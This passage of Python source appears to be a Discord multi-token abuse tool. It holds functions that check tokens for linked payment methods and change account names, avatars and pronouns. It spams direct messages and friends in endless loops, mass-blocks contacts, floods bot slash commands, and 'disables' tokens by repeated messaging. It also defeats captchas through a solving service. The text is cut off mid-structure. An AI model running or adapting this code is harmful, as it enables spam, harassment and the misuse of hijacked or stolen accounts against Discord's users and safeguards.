            if bot:
                mapping = {
                    "235148962103951360": "?help ctkp", "631159438337900575": "?poll",
                    "282859044593598464": "#top", "292953664492929025": "!serverinfo ctkp",
                    "240254129333731328": ">>serverinfo", "155149108183695360": "?serverinfo ctkp",
                    "916300992612540467": "v!", "439205512425504771": ".help",
                    "411916947773587456": "m!play ctkp", "718760319207473152": "sb#help",
                    "557628352828014614": "$help", "536991182035746816": "w!help",
                    "429457053791158281": "!help", "519287796549156864": "!rhelp",
                    "412347257233604609": "m!play ctkp", "412347553141751808": "m!play ctkp",
                    "412347780841865216": "m!play ctkp"
                }
                commands = [mapping[member] for member in members if member in mapping]
                if commands:
                    cls.log("info", "INFO", token, option=f"{len(commands)} Scraped Bots")
                return commands

            return members
        except Exception as e:
            cls.log("error", str(e), tokens[0], error=True)
            return []

    @classmethod
    def name_changer(cls, token, username, password):
        try:
            headers = cls.set_headers(token)
            while True:
                try:
                    payload = {"username": str(username)}
                    r = session.post("https://discord.com/api/v9/unique-username/username-attempt-unauthed", headers=headers, json=payload)
                    if r.status_code == 200:
                        if r.json()["taken"] == True:
                            cls.log("info", "Taked", token)
                        elif r.json()["taken"] == False:
                            payload = {"username": username, "password": password}
                            r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload, cookies=cls.get_cookie())
                            if r.status_code == 200:
                                cls.log("success", "CHANGE", token)
                                return
                            elif r.status_code == 401:
                                cls.log("error", "DEAD", token)
                                return
                            elif r.status_code == 400:
                                if "captcha_key" in r.json():
                                    cls.log("warn", "CAPTCHA", token)
                                    if settings["capmon_api_key"]:
                                        headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                                        headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                                        r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload, cookies=cls.get_cookie())
                                        if r.status_code == 200:
                                            cls.log("success", "CHANGE", token)
                                            return
                                else:
                                    cls.log("error", r.json()['message'], token, error=True)
                                    return
                            elif r.status_code == 429:
                                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                                return
                            else:
                                cls.log("error", "ERROR", token)
                                return
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
                    return
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def checker(cls, token):
        try:
            headers = cls.set_headers(token)
            r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
            if r.status_code == 200:
                print(f"                                {token}")
                return token
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return None

    @classmethod
    def get_info(cls, token, user_id):
        try:
            headers = cls.set_headers(token)
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            if r.status_code == 200:
                data = r.json()
                if user_id == data['id']:
                    print(f"                    TOKEN => {token}")
                    return True
                else:
                    return False
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return False

    @classmethod
    def pronouns_changer(cls, token, pronouns):
        try:
            headers = cls.set_headers(token)
            payload = {"pronouns": str(pronouns)}
            r = session.patch("https://discord.com/api/v9/users/%40me/profile", headers=headers, json=payload, cookies=cls.get_cookie())
            if r.status_code == 200:
                cls.log("success", "CHANGE", token)
                return
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
                return
            elif r.status_code == 400:
                if "captcha_key" in r.json():
                    cls.log("warn", "CAPTCHA", token)
                    if settings["capmon_api_key"]:
                        headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                        headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                        r = session.patch("https://discord.com/api/v9/users/%40me/profile", headers=headers, json=payload, cookies=cls.get_cookie())
                        if r.status_code == 200:
                            cls.log("success", "CHANGE", token)
                            return
                else:
                    cls.log("error", r.json()['message'], token, error=True)
                    return
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                return
            else:
                cls.log("error", "ERROR", token)
                return
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def global_name_changer(cls, token, globalname):
        try:
            headers = cls.set_headers(token)
            payload = {"global_name": str(globalname)}
            r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload, cookies=cls.get_cookie())
            if r.status_code == 200:
                cls.log("success", "CHANGE", token)
                return
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
                return
            elif r.status_code == 400:
                if "captcha_key" in r.json():
                    cls.log("warn", "CAPTCHA", token)
                    if settings["capmon_api_key"]:
                        headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                        headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                        r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload, cookies=cls.get_cookie())
                        if r.status_code == 200:
                            cls.log("success", "CHANGE", token)
                            return
                else:
                    cls.log("error", r.json()['message'], token, error=True)
                    return
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                return
            else:
                cls.log("error", "ERROR", token)
                return
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def hype_changer(cls, token, hype):
        try:
            headers = cls.set_headers(token)
            payload = {"house_id": hype}
            r = session.post("https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
            if r.status_code == 204:
                cls.log("success", "CHANGE", token)
                return
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
                return
            elif r.status_code == 400:
                cls.log("error", "DETECT", token)
                return
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                return
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def avatar_changer(cls, token):
        try:
            headers = cls.set_headers(token)
            with open("data\\avatar.png", "rb") as f:
                avatar = f.read()
            payload = {"avatar": f"data:image/png;base64,{(base64.b64encode(avatar).decode('utf-8'))}"}
            r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload, cookies=cls.get_cookie())
            if r.status_code == 200:
                cls.log("success", "CHANGE", token)
                return
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
                return
            elif r.status_code == 400:
                if "captcha_key" in r.json():
                    cls.log("warn", "CAPTCHA", token)
                    if settings["capmon_api_key"]:
                        headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                        headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                        r = session.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload, cookies=headers)
                        if r.status_code == 200:
                            cls.log("success", "CHANGE", token)
                            return
                else:
                    cls.log("error", r.json()['message'], token, error=True)
                    return
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                return
            else:
                cls.log("error", "ERROR", token)
                return
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def token_disabler(cls, token):
        while True:
            try:
                headers = {"Authorization": token}
                payload = {"recipients": ["1145018909284646973"]}
                r = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json=payload)
                if r.status_code == 403 and r.json().get("code") == 40002:
                    cls.log("success", "SUCCESS", token)
                    break
                else:
                    uid = r.json().get("id")
                    if uid:
                        payload = {"content": "-", "tts": False}
                        r = requests.post(f"https://discord.com/api/v9/channels/{uid}/messages", headers=headers, json=payload)
            except Exception as e:
                cls.log("error", str(e), token, error=True)
                return

    @classmethod
    def get_friend(cls, token):
        try:
            headers = cls.set_headers(token)
            r = session.get("https://discord.com/api/v10/users/@me/relationships", headers=headers)
            if r.status_code == 200:
                return r.json()
            else:
                cls.log("error", "ERROR", token)
                return None
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return None

    @classmethod
    def friend_blocker(cls, token, users):
        try:
            headers = cls.set_headers(token)
            for user in users:
                payload = {"type": 2, "target_user_id": user["id"]}
                r = session.put(f"https://discord.com/api/v10/users/@me/relationships/{user['id']}", json=payload, headers=headers)
                if r.status_code == 204:
                    cls.log("success", "BLOCKED", token, option=user["id"])
                else:
                    cls.log("error", "ERROR", token, option=user["id"])
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def friend_remover(cls, token, users):
        try:
            headers = cls.set_headers(token)
            for user in users:
                r = session.delete(f"https://discord.com/api/v10/users/@me/relationships/{user['id']}", headers=headers)
                if r.status_code == 204:
                    cls.log("success", "REMOVE", token, option=user["id"])
                else:
                    cls.log("error", "ERROR", token, option=user["id"])
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def friend_spammer(cls, token, users, message):
        try:
            headers = cls.set_headers(token)
            for user in users:
                payload = {"recipients": [user["id"]]}
                r = session.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json=payload)
                if r.status_code == 200:
                    channel = r.json().get("id")
                    if channel:
                        payload = {"content": message, "tts": False}
                        r = session.post(f"https://discord.com/api/v9/channels/{channel}/messages", json=payload, headers=headers)
                        if r.status_code == 200:
                            cls.log("success", "SENT", token, option=user["id"])
                        else:
                            cls.log("error", "ERROR", token, option=user["id"])
                else:
                    cls.log("error", "ERROR", token, option=user["id"])
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def dm(cls, token, userid):
        try:
            headers = cls.set_headers(token)
            payload = {"recipients": [userid]}
            r = session.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json=payload, cookies=cls.get_cookie())
            if r.status_code == 200:
                channel = r.json()["id"]
                return channel
            else:
                cls.log("error", "DM Channel Creation Failed", token)
                return None
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return None

    @classmethod
    def dm_spammer(cls, token, user, message, iterative=False):
        try:
            headers = cls.set_headers(token)
            channel = cls.dm(token, user)
            if not channel:
                return

            payload = {"mobile_network_type": "unknown", "content": str(message), "nonce": None, "tts": False, "flags": 0}
            while iterative:
                r = session.post(f"https://discord.com/api/v9/channels/{channel}/messages", headers=headers, json=payload, cookies=cls.get_cookie())
                if r.status_code == 200:
                    cls.log("success", "SENT", token, option=user)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token, option=user)
                    break
                elif r.status_code == 400:
                    if "captcha_key" in r.json():
                        cls.log("warn", "CAPTCHA", token, option=user)
                        if settings["capmon_api_key"]:
                            headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                            headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                            r = session.post(f"https://discord.com/api/v9/channels/{channel}/messages", headers=headers, json=payload, cookies=cls.get_cookie())
                            if r.status_code == 200:
                                cls.log("success", "SENT", token, option=user)
                    else:
                        cls.log("error", r.json().get('message', 'Unknown Error'), token, error=True, option=user)
                        break
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=user)
                    time.sleep(r.json()['retry_after'])
                else:
                    cls.log("error", "ERROR", token, option=user)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def friend_sender(cls, token, name):
        try:
            headers = cls.set_headers(token)
            payload = {"discriminator": None, "username": name}
            r = session.post("https://discord.com/api/v9/users/@me/relationships", json=payload, headers=headers, cookies=cls.get_cookie())
            if r.status_code == 204:
                cls.log("success", "SENT", token)
                return
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
                return
            elif r.status_code == 400:
                if "captcha_key" in r.json():
                    cls.log("warn", "CAPTCHA", token)
                    if settings["capmon_api_key"]:
                        headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                        headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                        r = session.post("https://discord.com/api/v9/users/@me/relationships", json=payload, headers=headers, cookies=cls.get_cookie())
                        if r.status_code == 204:
                            cls.log("success", "SENT", token)
                            return
                else:
                    cls.log("error", r.json().get('message', 'Unknown Error'), token, error=True)
                    return
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                return
            else:
                cls.log("error", "ERROR", token)
                return
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def probot(cls, token, guild, channel, url, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "282859044593598464",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "971443831067250803",
                    "id": "971443830819786859",
                    "name": "short",
                    "type": 1,
                    "options": [{"type": 3, "name": "url", "value": str(url)}],
                    "application_command": {
                        "id": "971443830819786859",
                        "type": 1,
                        "application_id": "282859044593598464",
                        "version": "971443831067250803",
                        "name": "short",
                        "description": "Shortens a URL.",
                        "options": [{"type": 3, "name": "url", "description": "Please enter a url", "required": True, "description_localized": "Please enter a url", "name_localized": "url"}],
                        "dm_permission": True,
                        "integration_types": [0],
                        "global_popularity_rank": 39,
                        "description_localized": "Shortens a URL.",
                        "name_localized": "short"
                    },
                    "attachments": []
                },
                "nonce": None,
                "analytics_location": "slash_ui"
            }
            while True:
                r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                if r.status_code == 204:
                    cls.log("success", "SENT", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    time.sleep(r.json()['retry_after'])
                else:
                    cls.log("error", "ERROR", token)
                time.sleep(int(float(delay)))
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def takasumibot_short(cls, token, guild, channel, url, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "981314695543783484",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "1135015980221870121",
                    "id": "1005804598851805359",
                    "name": "short",
                    "type": 1,
                    "options": [{"type": 3, "name": "url", "value": str(url)}],
                    "application_command": {
                        "id": "1005804598851805359",
                        "type": 1,
                        "application_id": "981314695543783484",
                        "version": "1135015980221870121",
                        "name": "short",
                        "description": "短縮URLを作成します",
                        "options": [{"type": 3, "name": "url", "description": "短縮するURL", "required": True, "description_localized": "短縮するURL", "name_localized": "url"}],
                        "dm_permission": True,
                        "integration_types": [0],
                        "global_popularity_rank": 28,
                        "description_localized": "短縮URLを作成します",
                        "name_localized": "short"
                    },
                    "attachments": []
                },
                "nonce": None,
                "analytics_location": "slash_ui"
            }
            while True:
                r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                if r.status_code == 204:
                    cls.log("success", "SENT", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    time.sleep(r.json()['retry_after'])
                else:
                    cls.log("error", "ERROR", token)
                time.sleep(int(float(delay)))
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def takasumibot_5000(cls, token, guild, channel, top, bottom, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "981314695543783484",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "1161974847853830235",
                    "id": "1090904501835268096",
                    "name": "5000",
                    "type": 1,
                    "options": [{"type": 3, "name": "top", "value": str(top)}, {"type": 3, "name": "bottom", "value": str(bottom)}],
                    "application_command": {
                        "id": "1090904501835268096",
                        "type": 1,
                        "application_id": "981314695543783484",
                        "version": "1161974847853830235",
                        "name": "5000",
                        "description": "5000兆円ジェネレーター",
                        "options": [{"type": 3, "name": "top", "description": "上の文字", "required": True, "description_localized": "上の文字", "name_localized": "top"}, {"type": 3, "name": "bottom", "description": "下の文字", "required": True, "description_localized": "下の文字", "name_localized": "bottom"}],
                        "dm_permission": True,
                        "integration_types": [0],
                        "global_popularity_rank": 6,
                        "description_localized": "5000兆円ジェネレーター",
                        "name_localized": "5000"
                    },
                    "attachments": []
                },
                "nonce": None,
                "analytics_location": "slash_ui"
            }
            while True:
                r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                if r.status_code == 204:
                    cls.log("success", "SENT", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    time.sleep(r.json()['retry_after'])
                else:
                    cls.log("error", "ERROR", token)
                time.sleep(int(float(delay)))
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def yuikabot(cls, token, guild, channel, top, bottom, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "699823803924086794",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "951104621223497767",
                    "id": "951104621127020552",
                    "name": "5000choyen",
                    "type": 1,
                    "options": [
                        {"type": 3, "name": "top", "value": str(top)},
                        {"type": 3, "name": "bottom", "value": str(bottom)}
                    ],
                    "application_command": {
                        "id": "951104621127020552",
                        "type": 1,
                        "application_id": "699823803924086794",
                        "version": "951104621223497767",
                        "name": "5000choyen",
                        "description": "5000兆円(の画像)を生成",
                        "options": [
                            {"type": 3, "name": "top", "description": "上の行", "required": False, "description_localized": "上の行", "name_localized": "top"},
                            {"type": 3, "name": "bottom", "description": "下の行", "required": False, "description_localized": "下の行", "name_localized": "bottom"},
                            {"type": 5, "name": "rainbow", "description": "虹色にする", "required": False, "description_localized": "虹色にする", "name_localized": "rainbow"},
                            {"type": 5, "name": "noalpha", "description": "背景透過を無効", "required": False, "description_localized": "背景透過を無効", "name_localized": "noalpha"}
                        ],
                        "integration_types": [0],
                        "global_popularity_rank": 2,
                        "description_localized": "5000兆円(の画像)を生成",
                        "name_localized": "5000choyen"
                    },
                    "attachments": []
                },
                "nonce": None,
                "analytics_location": "slash_ui"
            }
            while True:
                try:
                    r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                    if r.status_code == 204:
                        cls.log("success", "SENT", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                    time.sleep(int(float(delay)))
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def dyno_poll(cls, token, guild, channel, message, question, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "161660517914509312",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "1116144106754822178",
                    "id": "902618844798009344",
                    "name": "poll",
                    "type": 1,
                    "options": [
                        {
                            "type": 1,
                            "name": "create",
                            "options": [
                                {"type": 3, "name": "message", "value": str(message)},
                                {"type": 3, "name": "choice1", "value": str(question)},
                                {"type": 3, "name": "choice2", "value": str(question)},
                                {"type": 3, "name": "choice3", "value": str(question)},
                                {"type": 3, "name": "choice4", "value": str(question)},
                                {"type": 3, "name": "choice5", "value": str(question)},
                                {"type": 3, "name": "choice6", "value": str(question)},
                                {"type": 3, "name": "choice7", "value": str(question)},
                                {"type": 3, "name": "choice8", "value": str(question)},
                                {"type": 3, "name": "choice9", "value": str(question)},
                                {"type": 3, "name": "choice10", "value": str(question)}
                            ]
                        }
                    ],
                    "application_command": {
                        "id": "902618844798009344",
                        "type": 1,
                        "application_id": "161660517914509312",
                        "version": "1116144106754822178",
                        "name": "poll",
                        "description": "Start a poll (max 10 choices)",
                        "options": [
                            {
                                "type": 1,
                                "name": "show",
                                "description": "Show the results of a poll",
                                "options": [
                                    {"type": 3, "name": "message", "description": "Message ID or link", "required": True, "description_localized": "Message ID or link", "name_localized": "message"}
                                ]
                            },
                            {
                                "type": 1,
                                "name": "create",
                                "description": "Start a poll (max 10 choices)",
                                "options": [
                                    {"type": 3, "name": "message", "description": "Message", "required": True, "description_localized": "Message", "name_localized": "message"},
                                    {"type": 3, "name": "choice1", "description": "Choice 1", "required": True, "description_localized": "Choice 1", "name_localized": "choice1"},
                                    {"type": 3, "name": "choice2", "description": "Choice 2", "required": True, "description_localized": "Choice 2", "name_localized": "choice2"},
                                    {"type": 3, "name": "choice3", "description": "Choice 3", "required": False, "description_localized": "Choice 3", "name_localized": "choice3"},
                                    {"type": 3, "name": "choice4", "description": "Choice 4", "required": False, "description_localized": "Choice 4", "name_localized": "choice4"},
                                    {"type": 3, "name": "choice5", "description": "Choice 5", "required": False, "description_localized": "Choice 5", "name_localized": "choice5"},
                                    {"type": 3, "name": "choice6", "description": "Choice 6", "required": False, "description_localized": "Choice 6", "name_localized": "choice6"},
                                    {"type": 3, "name": "choice7", "description": "Choice 7", "required": False, "description_localized": "Choice 7", "name_localized": "choice7"},
                                    {"type": 3, "name": "choice8", "description": "Choice 8", "required": False, "description_localized": "Choice 8", "name_localized": "choice8"},
                                    {"type": 3, "name": "choice9", "description": "Choice 9", "required": False, "description_localized": "Choice 9", "name_localized": "choice9"},
                                    {"type": 3, "name": "choice10", "description": "Choice 10", "required": False, "description_localized": "Choice 10", "name_localized": "choice10"}
                                ]
                            }
                        ],
                        "dm_permission": False,
                        "integration_types": [0],
                        "global_popularity_rank": 4,
                        "description_localized": "Start a poll (max 10 choices)",
                        "name_localized": "poll"
                    },
                    "attachments": []
                },
                "nonce": None,
                "analytics_location": "slash_ui"
            }
            while True:
                try:
                    r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=payload)
                    if r.status_code == 204:
                        cls.log("success", "SENT", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 403:
                        cls.log("error", "NOT ACCESS", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                    time.sleep(int(float(delay)))
                except Exception as e:
                    cls.log("error", str(e), token, error=True)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def simple_poll(cls, token, guild, channel, message, question, delay):
        try:
            headers = cls.set_headers(token)
            sessionid = cls.rand_str(16)
            payload = {
                "type": 2,
                "application_id": "324631108731928587",
                "guild_id": str(guild),
                "channel_id": str(channel),
                "session_id": str(sessionid),
                "data": {
                    "version": "826357848694980639",
                    "id": "819257124907122690",
                    "name": "poll",
                    "type": 1,
                    "options": [
                        {"type": 3, "name": "question", "value": str(message)},
                        {"type": 3, "name": "choice_a", "value": str(question)},
                        {"type": 3, "name": "choice_b", "value": str(question)},
                        {"type": 3, "name": "choice_c", "value": str(question)},
                        {"type": 3, "name": "choice_d", "value": str(question)},
                        {"type": 3, "name": "choice_e", "value": str(question)},
                        {"type": 3, "name": "choice_f", "value": str(question)},
                        {"type": 3, "name": "choice_g", "value": str(question)},
                        {"type": 3, "name": "choice_h", "value": str(question)},
                        {"type": 3, "name": "choice_i", "value": str(question)},
                        {"type": 3, "name": "choice_j", "value": str(question)},
                        {"type": 3, "name": "choice_k", "value": str(question)},
                        {"type": 3, "name": "choice_l", "value": str(question)},
                        {"type": 3, "name": "choice_m", "value": str(question)},
                        {"type": 3, "name": "choice_n", "value": str(question)},
                        {"type": 3, "name": "choice_o", "value": str(question)},
                        {"type": 3, "name": "choice_p", "value": str(question)},
                        {"type": 3, "name": "choice_q", "value": str(question)},
                        {"type": 3, "name": "choice_r", "value": str(question)},
                        {"type": 3, "name": "choice_s", "value": str(question)},
                        {"type": 3, "name": "choice_t", "value": str(question)}
                    ],
                    "application_command": {
                        "id": "819257124907122690",
                        "type": 1,
                        "application_id": "324631108731928587",
                        "version": "826357848694980639",
                        "name": "poll",
                        "description": "Create a new poll.",
                        "options": [
                            {"type": 3, "name": "question", "description": "Type your question e.g. Have you had enough coffee?", "required": True, "description_localized": "Type your question e.g. Have you had enough coffee?", "name_localized": "question"},
                            {"type": 3, "name": "choice_a", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_a"},
                            {"type": 3, "name": "choice_b", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_b"},
                            {"type": 3, "name": "choice_c", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_c"},
                            {"type": 3, "name": "choice_d", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_d"},
                            {"type": 3, "name": "choice_e", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_e"},
                            {"type": 3, "name": "choice_f", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_f"},
                            {"type": 3, "name": "choice_g", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_g"},
                        {"type": 3, "name": "choice_h", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_h"},
                        {"type": 3, "name": "choice_i", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_i"},
                        {"type": 3, "name": "choice_j", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_j"},
                        {"type": 3, "name": "choice_k", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_k"},
                        {"type": 3, "name": "choice_l", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_l"},
                        {"type": 3, "name": "choice_m", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_m"},
                        {"type": 3, "name": "choice_n", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_n"},
                        {"type": 3, "name": "choice_o", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_o"},
                        {"type": 3, "name": "choice_p", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_p"},
                        {"type": 3, "name": "choice_q", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_q"},
                        {"type": 3, "name": "choice_r", "description": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "required": False, "description_localized": "Type choice e.g. Coffee!. Putting emoji at the front will change bot reaction e.g. :coffee: Coffee!", "name_localized": "choice_r"},
